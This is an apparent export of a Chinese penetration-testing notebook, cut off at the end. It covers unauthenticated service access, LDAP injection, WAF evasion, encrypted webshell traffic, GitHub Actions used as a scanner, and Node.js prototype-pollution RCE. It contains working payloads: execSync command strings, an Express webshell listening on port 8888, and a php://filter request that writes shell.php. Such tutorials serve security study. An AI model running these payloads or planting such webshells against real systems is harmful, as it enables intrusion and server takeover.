可以看到路由信息 10250端口是kubelet API的HTTPS端口，通过路径:https://xxx.xxx.xxx.xxx/10250/pods获取环境变量、运行的容器信息、命名空间等信息 Active MQ 未授权访问 端口：8161 介绍：ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。 漏洞利用： 默认口令：admin/admin Jupyter Notebook 未授权访问 端口：8888 介绍：Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。 漏洞利用： 访问http://xxx.xxx.xxx.xxx:8888，将看到Jupyter Notebook的Web管理界面，并没有要求填写密码 选择 new -> terminal 即可创建一个控制台 直接执行任意命令 Elasticsearch 未授权访问 端口：9200,9300 介绍：Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。 漏洞利用： 直接访问http://xxx.xxx.xxx.xxx:9200 _cat/indices _river/_search 数据库信息 _nodes 节点信息 _plugin/head （有head插件的情况下） Zabbix 未授权访问 端口：10051 介绍：zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。 漏洞利用 无需账户密码直接访问zabbix页面 RabbitMQ 未授权访问 端口：15672,15692,25672 介绍：RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。 漏洞利用： 默认账号密码都是guest MongoDB 未授权访问 端口：27017 介绍：开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。 漏洞利用： 使用数据库连接工具 如navicat 等直接连接 NFS 未授权访问 端口：2049，20048 介绍：NetworkFileSystem(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏 漏洞利用： 安装nfs客户端 nfs-common 查看nfs服务器上的共享目录 showmount -e xxx.xxx.xxx.xxx 挂载相应共享目录到本地 mount -t nfs xxx.xxx.xxx.xxx:/grdata /mnt Dubbo 未授权访问 端口：28096 介绍：Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞 漏洞利用：telnet ip port Druid 未授权访问 端口：/ 介绍：Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问 漏洞利用： /druid/index.html /druid/websession.html /druid/datasource.html /druid/sql.html /druid/spring.html Solr 未授权访问 端口：443,8443 介绍：Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell 漏洞利用 /solr/admin SpringBoot Actuator 未授权访问 端口：/ 介绍：Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。 漏洞利用： /actuator/autoconfig /actuator/env /actuator/dump /actuator/headdump 可下载 SwaggerUI未授权访问漏洞 端口：/ 介绍：Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。 漏洞利用： swagger-ui未直接部在IP根目录下 直接访问 Harbor未授权添加管理员漏洞 端口：/ 介绍：Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库 漏洞利用： /harbor/sign-in 注册管理员 参考链接 https://blog.csdn.net/weixin_57567655/article/details/126493671 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:51:37 "},"知识库/01.WEB安全/16.LDAP/":{"url":"知识库/01.WEB安全/16.LDAP/","title":"16.LDAP","keywords":"","body":"LDAP 注入 简介 LDAP(Lightweight Directory Access Protocol)：轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现，是运行于TCP/IP之上的协议，端口号为：389， 加密636（SSL） 属性 解释 dn（Distinguished Name） 一条记录的位置 ，描述如下cn=user,ou=marketing,ou=pepple,dc=mydomain,dc=org dc(domain compoent) 一条记录所属区域 域名部分 ou (Organization Unit) 一条记录所属组织 cn/uid（Common Name） 一条记录的名字/ID Entry 条目记录数 原理 攻击者将特制的数据输入到LDAP查询或过滤器中，模拟正常LDAP查询操作，但当查询完成时，攻击者恶意数据被LDAP服务显示出来，从而导致安全问题的发生 LDAP注入本质就是在OpenLDAP实施中，由于一个括号内代表一个过滤器，第二个过滤器会被忽略，只有第一个会被执行。当查询语句带有逻辑操作符时，可以通过注入恶意的LDAP语句去达到不同的目的 基本的LDAP语法 = 等于 & 逻辑和 | 逻辑或 ! 逻辑不 * 通配符 逻辑操作符(AND、OR、NOT)和关系操作符(=、>=、 除使用逻辑操作符外，RFC4256还允许使用下面的单独符号作为两个特殊常量： (&) ->Absolute TRUE (|) ->Absolute FALSE 对象定义： objectclass: top objectclass: person 对象类定义： objectclass: person objectclasses=( 2.5.6.6 NAME 'person' DESC 'Defines entries that generically represent people.' SUP 'top' STRUCTURAL MUST ( cn $ sn ) MAY ( userPassword $ telephoneNumber $ seeAlso $ description ) 属性定义： attributetypes=( 2.5.4.4 NAME ( 'sn' 'surName' ) DESC 'This is the X.500 surname attribute, which contains the family name of a person.' SUP 2.5.4.41 EQUALITY 2.5.13.2 ORDERING 2.5.13.3 SUBSTR 2.5.13.4 USAGE userApplications ) 搜索语法： 主要根据属性和值进行搜索 attribute operator value LDAP查询语句 一个圆括号内的判断语句又称为一个过滤器filter。 默认情况下，LDAP的DN和所有属性都不区分大小写 ( \"&\" or \"|\" (filter1) (filter2) (filter3) ...) (\"!\" (filter)) LDAP注入 无逻辑操作符的注入 后端代码如果是这样写的： (attribute=$input) 构造输入语句： $input=value)(injected_filter 完整的语句就成下面这样了： (attribute=value)(injected_filter) 由于一个括号内代表一个过滤器，在OpenLDAP实施中，第二个过滤器会被忽略，只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的。因而这类情况仅对于OpenLDAP有一定的影响。 例如我们要想查询一个字段是否存在某值时，可以用$input=x*进行推移，利用页面响应不同判断x*是否查询成功 带有逻辑操作符的注入 (|(attribute=$input)(second_filter)) (&(attribute=$input)(second_filter)) 此时带有逻辑操作符的括号相当于一个过滤器。此时形如value)(injected_filter)的注入会变成如下过滤器结构 (&(attribute=value)(injected_filter))(second_filter) 虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。 案例分享 万能用户名案例 验证登陆的查询语句是这样: (&(USER=$username)(PASSWORD=$pwd)) 输入$username = admin)(&)(使查询语句变为 (&(USER=admin)(&))((PASSWORD=$pwd)) 即可让后面的password过滤器失效，执行第一个过滤器而返回true，达到万能密码的效果 权限提升案例 现假设下面的查询会向用户列举出所有可见的低安全等级文档 (&(directory=document)(security_level=low)) 这里第一个参数document是用户入口，low是第二个参数的值。如果攻击者想列举出所有可见的高安全等级的文档，他可以利用如下的注入： document)(security_level=*))(&(directory=documents 生成的过滤器为： (&(directory=documents)(security_level=*))(&(direcroty=documents)(security_level=low)) LDAP服务器仅会处理第一个过滤器而忽略第二个，因而只有下面的查询会被处理：(&(directory=documents)(security_level=*))，而(&(direcroty=documents)(security_level=low))则会被忽略。结果就是，所有安全等级的可用文档都会列举给攻击者，尽管他没有权限看它们。 参考链接 https://www.cnblogs.com/endust/p/11811477.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 15:03:56 "},"知识库/01.WEB安全/99.其他/01.WAF绕过通用思路.html":{"url":"知识库/01.WEB安全/99.其他/01.WAF绕过通用思路.html","title":"01.WAF绕过通用思路","keywords":"","body":"概述 通用的方法，不仅限于SQL注入，就是万金油，无非就是大小写、双写、编码、注释、垃圾字符、分块传输、HPP、WAF特性等 核心：所有能改的地方，都捣鼓捣鼓改改，增加就加，能删就删，多拿点其他内容来混淆视听。 大小写 unIoN Select 双写 一些后端可能会直接给关键词过滤为空，那么就可以利用双写来绕过 ununionion ==> 去掉union ==> union 编码 URL编码 Unicode编码 十六进制编码 其他后端会解析的编码注释 如mysql中的内联注释，可以用来代替空格 注释也可以和换行搭配使用，注释掉后面的内容，再通过换行逃逸到注释之外test.php?id=1 /*!order*//**/%23A%0A/**/%23A%0A/*!by*//**/2 垃圾字符 一些WAF设置了过滤的数据包长度，如果数据包太大太长，为了考虑性能就会直接略过这个数据包GET /foo?sqli=111...80万个1...111'+and+2*3=6+--+ HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */* 分块传输 burp插件：https://github.com/c0ny1/chunked-coding-converter.git 在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。HTTP协议绕过 HTTP 0.9 HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果参数污染（HPP） 简单来说，存在多个同名参数的情况下，可能存在逻辑层和WAF层对参数的取值不同，即可能逻辑层使用的第一个参数，而WAF层使用的第二个参数，我们只需要第二个参数正常，在第一个参数插入payload，这样组合起来就可以绕过WAF，如下数据包：GET /foo?par=first&par=last HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */* 部分中间件的处理方法： Web环境 参数获取函数 获取到的参数 PHP/Apache $_GET(\"par\") last JSP/Tomcat Request.getParameter(\"par\") first Perl(CGI)/Apache Param(\"par\") first Python/Apache getvalue(\"par\") [\"first\",\"last\"] ASP.NET/IIS Request.QueryString(\"par\") first,last Pipeline（keep-alive） http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止 我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf 记得把brupsuite自动更新Content-Length的勾去掉 大概数据包就是这样 POST / HTTP/1.1 Host: www.baidu.com User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 3 a=1GET / HTTP/1.1 Host: www.baidu.com User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Connection: close HTTP charset 利用Content-Type: xxx;charset=xxx编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果 application/x-www-form-urlencoded; charset=ibm037 multipart/form-data; charset=ibm037, boundary=blah multipart/form-data; boundary=blah ; charset=ibm037 WAF特性 云WAF绕过 找到真实IP，修改本地hosts文件或者直接在burp中指定解析，避免流量走到云WAF上即可。 白名单绕过 一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 如：WAF设立了白名单/admin，那么我们的测试payload可以通过如下的手法来绕过 # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?a=/admin&id=123 and 2*3=6 静态文件绕过 一些WAF为了减少服务器的压力，会对静态文件如.png、.css等直接放行，那么我们可以尝试伪装成静态文件来绕过 如： # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?1.jpg&id=123 and 2*3=6 Content-Type绕过 一些WAF识别到特定的content-type后，则会判定为该请求的类型，如： 发现Content-Type为multipart/form-data时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload 请求方式绕过 一些WAF对于get请求和post请求的处理机制不一样，可能对POST请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。 一些WAF检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。 解析兼容性 一些WAF检测时，完全按照标准的HTTP协议去匹配，但WEB容器会做一些兼容性适配，如上传时 filename=\"shell.php\" 我们只需要稍加修改，那么按照标准协议去解析就找不到文件名，从而绕过拦截 filename=\"shell.php filename='shell.php' filename=shell.php 容器特性 [!tip] 可通过所有fuzz一遍，看看容器是如何处理的 IIS+ASP： %会被自动去掉 unicode会自动解码 == tomcat: 路径穿越 /path1/path2/ == ;/path1;foo/path2;bar/; 参考 waf绕过拍了拍你 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:51:44 "},"知识库/01.WEB安全/99.其他/02.蚁剑RSA加密绕过检测.html":{"url":"知识库/01.WEB安全/99.其他/02.蚁剑RSA加密绕过检测.html","title":"02.蚁剑RSA加密绕过检测","keywords":"","body":"新增了PHP RSA编码器，下拉菜单中找到编码设置，点击RSA配置点击生成会生成一段PHP shell代码。 点击新建编码器创建一个PHP RSA编码器 选择编码器为刚刚创建的PHP RSA编码器测试连接 流量已经完全加密 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:52:04 "},"知识库/01.WEB安全/99.其他/03.GitHub云扫描器.html":{"url":"知识库/01.WEB安全/99.其他/03.GitHub云扫描器.html","title":"03.GitHub云扫描器","keywords":"","body":"前言 GitHub提供六小时的容器使用时长。 可以利用其进行对外的端口扫描、目录扫描等操作。 过程举例 https://github.com/inbug-team/InCloud 运行于GitHub Actions 的仓库中自动化、自定义和执行软件开发工作流程，可以自己根据喜好定制功能，InCloud已经为您定制好了八种针对网段和域名的不同场景的信息收集与漏洞扫描流程。 PortScan-AllPort 对单IP文件列表进行全端口扫描，输出可用Web服务标题。 PortScan-AllPort-Xray-Dirscan 对单IP文件列表进行全端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描，对Web服务进行Ffuf目录递归扫描。。 PortScan-Top1000 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题。 PortScan-Top1000-Xray 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描。 PortScan-Top1000-Dirscan 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题，，对Web服务进行Ffuf目录递归扫描。 SubDomain-Portscan-Vulnscan 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Nuclei漏洞扫描。 SubDomain-Portscan-Xray 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描。 SubDomain-Portscan-Dirscan 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，，对Web服务进行Ffuf目录递归扫描。 这里以端口扫描为例 1、将项目fork到自己的github，选择端口扫描的分支。 2、修改流程文件（.github/workflows/incloud.yaml）里的 git config --local user.email 与 git config --global user.name 改成自己的邮箱与自己的ID（用于报告输出，可忽略）。 3、修改input目录的扫描目标 4、使用action标签进行在线编译。 5、查看运行的任务 6、点击build可查看对应的运行过程 7、GitHub提供六小时的容器使用时长，扫描结束后，扫描结果会自动上传到自己fork的output文件夹下。 8、需要更新最新版本，请删除fork的项目再重新fork此项目。 分析 GitHub Actions 入门教程 GitHub官方文档 GitHub官方市场 GitHub Actions 是什么？ 大家知道，持续集成由很多操作组成，比如抓取代码、运行测试、登录远程服务器，发布到第三方服务等等。GitHub 把这些操作就称为 actions。 很多操作在不同项目里面是类似的，完全可以共享。GitHub 注意到了这一点，想出了一个很妙的点子，允许开发者把每个操作写成独立的脚本文件，存放到代码仓库，使得其他开发者可以引用。 如果你需要某个 action，不必自己写复杂的脚本，直接引用他人写好的 action 即可，整个持续集成过程，就变成了一个 actions 的组合。这就是 GitHub Actions 最特别的地方。 GitHub 做了一个官方市场，可以搜索到他人提交的 actions。另外，还有一个 awesome actions 的仓库，也可以找到不少 action。 上面说了，每个 action 就是一个独立脚本，因此可以做成代码仓库，使用userName/repoName的语法引用 action。比如，actions/setup-node就表示github.com/actions/setup-node这个仓库，它代表一个 action，作用是安装 Node.js。事实上，GitHub 官方的 actions 都放在 github.com/actions 里面。 既然 actions 是代码仓库，当然就有版本的概念，用户可以引用某个具体版本的 action。下面都是合法的 action 引用，用的就是 Git 的指针概念，详见官方文档。 actions/setup-node@74bc508 # 指向一个 commit actions/setup-node@v1.0 # 指向一个标签 actions/setup-node@master # 指向一个分支 基本概念 GitHub Actions 有一些自己的术语。 （1）workflow （工作流程）：持续集成一次运行的过程，就是一个 workflow。 （2）job （任务）：一个 workflow 由一个或多个 jobs 构成，含义是一次持续集成的运行，可以完成多个任务。 （3）step（步骤）：每个 job 由多个 step 构成，一步步完成。 （4）action （动作）：每个 step 可以依次执行一个或多个命令（action）。 workflow 文件 GitHub Actions 的配置文件叫做 workflow 文件，存放在代码仓库的.github/workflows目录。 workflow 文件采用 YAML 格式，文件名可以任意取，但是后缀名统一为.yml，比如foo.yml。 一个库可以有多个 workflow 文件。GitHub 只要发现.github/workflows目录里面有.yml文件，就会自动运行该文件。 workflow 文件的配置字段非常多，详见官方文档。下面是一些基本字段。 name name字段是 workflow 的名称。如果省略该字段，默认为当前 workflow 的文件名。 name: GitHub Actions Demo on on字段指定触发 workflow 的条件，通常是某些事件。 on: push 上面代码指定，push事件触发 workflow。 on字段也可以是事件的数组。 on: [push, pull_request] 上面代码指定，push事件或pull_request事件都可以触发 workflow。 完整的事件列表，请查看官方文档。除了代码库事件，GitHub Actions 也支持外部事件触发，或者定时运行。 on.. 指定触发事件时，可以限定分支或标签。 on: push: branches: - master 上面代码指定，只有master分支发生push事件时，才会触发 workflow。 jobs..name workflow 文件的主体是jobs字段，表示要执行的一项或多项任务。 jobs字段里面，需要写出每一项任务的job_id，具体名称自定义。job_id里面的name字段是任务的说明。 jobs: my_first_job: name: My first job my_second_job: name: My second job 上面代码的jobs字段包含两项任务，job_id分别是my_first_job和my_second_job。 jobs..needs needs字段指定当前任务的依赖关系，即运行顺序。 jobs: job1: job2: needs: job1 job3: needs: [job1, job2] 上面代码中，job1必须先于job2完成，而job3等待job1和job2的完成才能运行。因此，这个 workflow 的运行顺序依次为：job1、job2、job3。 jobs..runs-on runs-on字段指定运行所需要的虚拟机环境。它是必填字段。目前可用的虚拟机如下。 ubuntu-latest，ubuntu-18.04或ubuntu-16.04 windows-latest，windows-2019或windows-2016 macOS-latest或macOS-10.14 下面代码指定虚拟机环境为ubuntu-18.04。 runs-on: ubuntu-18.04 jobs..steps steps字段指定每个 Job 的运行步骤，可以包含一个或多个步骤。每个步骤都可以指定以下三个字段。 jobs..steps.name：步骤名称。 jobs..steps.run：该步骤运行的命令或者 action。 jobs..steps.env：该步骤所需的环境变量。 下面是一个完整的 workflow 文件的范例。 name: Greeting from Mona on: push jobs: my-job: name: My Job runs-on: ubuntu-latest steps: - name: Print a greeting env: MY_VAR: Hi there! My name is FIRST_NAME: Mona MIDDLE_NAME: The LAST_NAME: Octocat run: | echo $MY_VAR $FIRST_NAME $MIDDLE_NAME $LAST_NAME. 上面代码中，steps字段只包括一个步骤。该步骤先注入四个环境变量，然后执行一条 Bash 命令。 PortScan-AllPort分析 name: incloud # workflow名称 on: workflow_dispatch: # 手动触发 jobs: # 任务 build: # job id runs-on: ubuntu-latest # 指定运行所需要的虚拟机环境 steps: # 步骤 # Checkout a Git repository at a particular version - name: Checkout Repo # 步骤名 uses: actions/checkout@master # 指向一个分支 https://github.com/marketplace/actions/checkout # 配置Go环境 - name: Setup golang uses: actions/setup-go@v2 # https://github.com/marketplace/actions/setup-go-environment with: go-version: 1.14 # 安装依赖 - name: Setup Dependencies run: sudo apt-get install libpcap-dev - name: Cache Go id: cache-go uses: actions/cache@v2 with: path: /home/runner/go key: ${{ runner.os }}-go - name: Setting up ProjectDiscovery tools if: steps.cache-go.outputs.cache-hit != 'true' env: GO111MODULE: on run: | go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder go get -v github.com/projectdiscovery/dnsx/cmd/dnsx go get -v github.com/projectdiscovery/naabu/v2/cmd/naabu go get -v github.com/projectdiscovery/httpx/cmd/httpx go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei shell: bash - name: Running naabu to check top all ports run: | naabu -iL input/target.txt -rate 10000 -p - | tee output/active_ports.txt shell: bash - name: Running httpx for HTTP webservers probbing run: | httpx -l output/active_ports.txt -title httpx -l output/active_ports.txt | tee output/active_urls.txt shell: bash - name: Sorting the output results run: | find output -type f -exec sort {} -o {} \\; shell: bash # 更新扫描结果到github仓库中 - name: Create local changes run: | git add output/active_ports.txt git add output/active_urls.txt - name: Commit results to Github run: | git config --local user.email \"admin@inbug.org\" git config --global user.name \"inbug-team\" git commit -m \"InCloud Report\" -a --allow-empty - name: Push changes uses: ad-m/github-push-action@master with: github_token: ${{ secrets.GITHUB_TOKEN }} branch: ${{ github.ref }} 举一反三 分析发现也不是特别麻烦 只需要 配置环境 --> 安装工具 --> 下发扫描任务 --> 上传报告 即可 后续可根据自己的需求，编写特定的workflow执行相应的任务。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:52:38 "},"知识库/01.WEB安全/99.其他/04.JavaScript 原型链污染.html":{"url":"知识库/01.WEB安全/99.其他/04.JavaScript 原型链污染.html","title":"04.JavaScript 原型链污染","keywords":"","body":"变量类型 在JavaScript中，有6种原始值分别是： boolean number string undefined symbol null 3种引用类型，分别是： 对象 (Object) 数组 (Array) 函数 (Function) 引用类型都是对象，通过 instanceof 操作符来判断对象的类型 JavaScript instanceof 能判断对象的原理就是判断一个对象与其构造函数是否在同一个原型链上，但其实instanceof用来判断类型并不准确，常用Object.prototype.toString.call()来判断数据类型 什么是原型，原型链 原型 JavaScript的所有对象(实例)中都包含一个__proto__内部属性，这个属性所对应的就是该对象的原型，对象都从原型继承方法和属性 JavaScript的函数对象，除了原型__proto__属性之外，还预置了prototype属性，当函数对象作为构造函数创建实例的时候，该prototype属性将被作为实例对象的原型__proto__ 构造函数new的时候发生了什么？ var obj = {}; obj.__proto__ = Base.prototype Base.call(obj) 创建一个新的对象obj 将这个空对象的__proto__成员指向Base函数对象prototype成员对象 Base函数对象的this指针替换成obj，相当于执行Base.call(obj) 如果构造函数显示地返回一个对象，那么这个实例则为返回的对象，否则返回这个新创建的对象。 普通对象的原型 函数对象（构造函数)的prototype === 实例对象的原型 原型链 任何一个实例对象通过原型链都可以找到它对应的原型对象，并且原型对象上面的实例和方法都是被实例所共享的，一个对象在查找一个方法或者属性时，他会先在自己的对象中找，如果找不到，就会沿着原型链依次向上找，直到最后到Object 函数才有prototype，实例对象只有__proto__，而函数有__proto__是因为函数是Function对象的实例 在这里我创建一个obj，里面只有 name和 age属性，然后在其原型上创建msg属性，getMsg 方法，然后该对象中不存在msg属性，getMsg方法，但是当需要使用 msg 属性，getMsg 方法的时候，JavaScript就会沿着原型链去寻找msg属性，getMsg方法，如果找到了就返回，如果直到顶层object都没有，则返回undefined 那么是不是我修改了Object的prototype是不是就可以为所欲为了？并不是这样，当对象当前无属性或者方法的时候，才会一层一层通过原型链去查找原型上的方法或属性，当存在该属性或者方法的时候，则会停止向上查找，且直接返回。所以当在原型链上只要有一个原型存在该方法，则不会调用Object原型中的方法。 Demo 我使用Node.js 启动一个web环境（Express），代码如下： const express = require('express') const app = new express() const obj = { getMsg: 'hello world', getList: getReadMsg() } function getReadMsg(){ return 'test' } Object.freeze(obj) app.get('/', (req, res) => { const resp = eval('obj.' + req.query.test) res.send(resp) }) app.listen( 8081,()=>{ console.log('running on 8081 port!') }) 注意，在这里使用了eval方法，（eval方法会使用JavaScript解释该字符串），且对象表示法使用了点表示法取对象的属性或者方法 可以看见，test 参数处可拼接属性值，并使用对象点表示法，执行对象。 在这里有Object.freeze(obj)，这里表示冻结该对象，不允许对对象属性进行修改 payload_1 针对obj.getMsg / obj.getList 的原型进行构造payload ?test=getMsg.__proto__.secFunc=function(){return+\"secTest,hello+world\"} ?test=getMsg.__proto__.secFunc() => ?test=getMsg.__proto__.secFunc=function(){return+\"secTest,hello+world\"}() 原理： obj.getMsg 的类型是String类型，字符串方法全都源自其原型上的方法，那么将secFunc方法写在其原型上，然后再调用 // 这里的secFunc 是一个 Function obj.getMsg.__proto__.secFunc = function(){return \"secTest,hello world\"} // 调用该方法 obj.getMsg.secFunc() // 或者 指定第一层原型上的secFunc方法 obj.__proto__.secFunc() // 又因为以下表达式会返回一个function，那么在JavaScript里，只要返回值是function在其后加上括号即可立即执行方法 obj.getMsg.__proto__.secFunc = function(){return \"secTest,hello world\"}() payload_2 存在Object.freeze 方法，不允许在object里添加属性，那么给他的原型添加方法并调用 ?test=__proto__.secTest=function(){return \"secTest,hello world\"} ?test=secTest() => ?test=__proto__.secTest=function(){return \"secTest,hello world\"}() payload_3 向该对象添加立即执行函数 ?test=secTest=function(){return \"secTest,hello world\"}() 漏洞利用 以该demo作为漏洞环境，使用node.js的child_process模块，完成命令执行 0x1 命令执行 ?test=secTest=function(){return+require('child_process').execSync('whoami')}() 这里的require('child_process').execSync(command)中的execSync是指同步执行，并将结果返回回来，如果是使用exec方法，在JavaScript中会将其构造成异步任务，取数据要从promise/或者使用回调函数取，对于攻击者并不友好，所以我们使用时间换效率的方式来完成命令执行 0x2 如何向Node.js 服务上传webshell 关于Node.js 上传webshell我查阅了很多文档，其实都没有说得很明白，我以前是搞web开发的，所以还是或多或少了解JavaScript的特性，node.js启动的web服务，其实和serlvet，apache有很明显的区别，servlet，apache等都可以解析相应的.php,.jsp文件，而虽说node.js也有模板语法，但是Node只解析相应的模板文件，这种模板文件都是静态文件，只是提供数据渲染，而不是动态执行，所以基于node.js，python的模板解析上传可解析的文件，其实是不奏效的，并不能执行命令，因为node.js，python启动的web服务，是通过进程启动，所以我们要使其执行应该使用js文件，那么要达成可视化的webshell，通过这个demo，使用命令执行，启动一个新的端口，来执行命令 思路01 ?test=getMSg;Reflect.construct(Function,[res.send(require('child_process').execSync('whoami'))]) 分号用于换行，在ESlint中，是舍弃了分号，但是如果没有较好的编码规范或者良好的打包方式，如果将代码写成一行，则会造成代码不可读 Reflect是JavaScript的一个内置对象，Reflect.construct() 方法的行为有点像 new 操作符 构造函数 ， 相当于运行 new target(...args) 语法如下： Reflect.construct(target, argumentsList[, newTarget]) target为Function，argunmentList则为需要传入的方法，再此处就将结果返回回来，在这里就可以看见我们执行了whoami并回显回来了 在未使用return 返回结果的时候，使用该方式发现又可以代码执行，那么再启动一个端口，用于执行命令，就达到了webshell的功能 这里我图方便没有使用nodejs的http模块启动，而是使用express模块执行（需要下载express库) 代码 const express_1 = require('express') const app_1 = new express_1() app_1.get('/', (req_1, res_1)=>{ res_1.header('Content-Type','text/html') res_1.send(require('child_process').execSync(req_1.query.cmd)) }) app_1.listen('8888') Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:52:47 "},"知识库/01.WEB安全/99.其他/05.php filter协议利用.html":{"url":"知识库/01.WEB安全/99.其他/05.php filter协议利用.html","title":"05.php filter协议利用","keywords":"","body":"背景 屈总今天给了一个CTF题，看起来很简单，但是细看要是不了解file_put_contents利用技巧，这个题也解不出来，先看代码 \\n\"; $content = $data.base64_decode($_GET['data']); echo $content; file_put_contents($_GET['path'], $content); echo 'OK'; } else{ highlight_file(__FILE__); } ?> poc如下 http://127.0.0.1/2.php?path=php://filter/write=convert.base64-decode/resource=shell.php&data=aaaaUEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr 效果如下 通过这个题，通过使用php://filter来构造相关payload以达到写入webshell，来达到控制服务器的目的，但其危害并不只如此，还可以配合使用文件包含，文件读取，反序列化，XXE等组合攻击。 借此机会来学习学习，探索php://filter的相关姿势 php://filter 协议利用 介绍 php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器 php://filter 目标使用以下的参数作为它路径的一部分。 